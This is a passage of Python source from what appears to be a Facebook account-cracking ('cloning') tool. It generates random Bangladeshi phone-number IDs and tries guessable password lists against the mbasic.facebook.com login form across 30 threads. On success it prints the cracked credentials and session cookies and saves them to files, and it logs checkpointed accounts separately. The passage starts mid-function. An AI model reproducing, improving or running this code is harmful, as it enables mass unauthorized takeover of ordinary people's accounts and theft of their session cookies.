        print(f"\x1b[1;94mＢ\x1b[1;92m***************************\033[1;92m X\033[1;93m－\033[1;94mM\033[1;95mA\033[1;96mF\033[1;95mI\033[1;94mY\033[1;96mA\x1b[\033[38;5;46m ***************************\x1b[1;91m ●   ")
        print ('')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'@@',kode+'##',kode+'hasan',kode+'1122',kode+'1988',kode+guru,kodex+'123',kodex+'1234',kodex+'12345','bangladesh','10203040']
            yaari.submit(ooo,uid,pwx,tl)
    print(' [\033[1;92m\033[1;34m✔\033[1;92m] Crack process has been completed')
    print(' [\033[1;92m\033[1;34m✔\033[1;92m] Ids saved in ok.txt,cp.txt')
    
    
    
def C3():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' \033[1;94m[♨️] ENTER SIM CORD: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' BD NUMBER CLONE '
    limit = int(input('\033[1;92m[●]EXAMPLE: 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[\033[1;92m\033[1;34m✔\033[1;92m]\033[1;92mTOTAL IDS:\033[1;92m '+tl)
        print(f"[\033[1;92m\033[1;34m✔\033[1;92m]\033[1;92mTarget Doamin:\033[1;92m {doamin}")
        print('[\033[1;92m\033[1;34m✔\033[1;92m]\033[1;92mTHE PROCESS HAS BEEN STARTED ')
        print('[\033[1;92m\033[1;34m✔\033[1;92m]\033[1;96mUSE AROPELEN MOD ON OF FOR OK IDS ')
        print(50*'_')
        file()
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','@@@@@','najmul123','najmul1234','najmul@@']
            yaari.submit(ABIR,uid,pwx,tl)
    print(50*'_')
    print(' [\033[1;92m\033[1;34m✔\033[1;92m] Crack process has been completed')
    print(' [\033[1;92m\033[1;34m✔\033[1;92m] Ids saved in ok.txt,cp.txt')
    print(50*'_')
    
        
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents 
    try:
        for ps in pwx:
        	pro = random.choice(ugen)
        	bi = random.choice([P,M,K,B,U,O,N,H])
        	session = requests.Session()
        	free_fb = session.get('https://x.facebook.com').text
        	log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
        	header_freefb = {'authority': 'mbasic.facebook.com',
              "method": 'GET',
              "scheme": 'https',
              'path': '/login/?li=_GUVZNKn-dZw-sO9i4O23P8q&e=1348029&shbl=1&refsrc=deprecated&_rdr',
 		     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 		     'accept-language': 'en-US,en;q=0.9',
		      'cache-control': 'max-age=0',
  		    'sec-ch-prefers-color-scheme': 'light',
		      'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
 		     'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
 		     'sec-ch-ua-mobile': '?1',
 		     'sec-ch-ua-platform': '"Android"',
		      'sec-ch-ua-platform-version': '"10.0.0"',
 		     'sec-fetch-dest': 'document',
		      'sec-fetch-mode': 'navigate',
   		   'sec-fetch-site': 'none',
      		'sec-fetch-user': '?1',
     		 'upgrade-insecure-requests': '1',
  		    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
        	lo = session.post('https://mbasic.facebook.com/login/?li=_GUVZNKn-dZw-sO9i4O23P8q&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
        	log_cookies=session.cookies.get_dict().keys()
        	if 'c_user' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[151:166]
        	    ##print('\x1b[1;91m● \x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m Ｃ\033[1;93mＹ\033[1;94mＢ\033[1;95mＥ\033[1;96mＲ\033[1;95m－\033[1;94m５\033[1;96m０\033[1;92m5\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ● ')
        	    print ('')
        	    print('\033[38;5;46m[\033[1;92mABIR\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[38;5;46m [\033[1;96mCOOKIE[💉]\033[38;5;46m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/ABIR-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[ABIR.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/ABIR-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        loop+=1
        #sys.stdout.write('\r%s[ABIR]%s/%s][OK-%s]\033[1;92m[CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.write('\r%s[ABIR]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
	
    except:
     pass


##########aprovel#########






o()

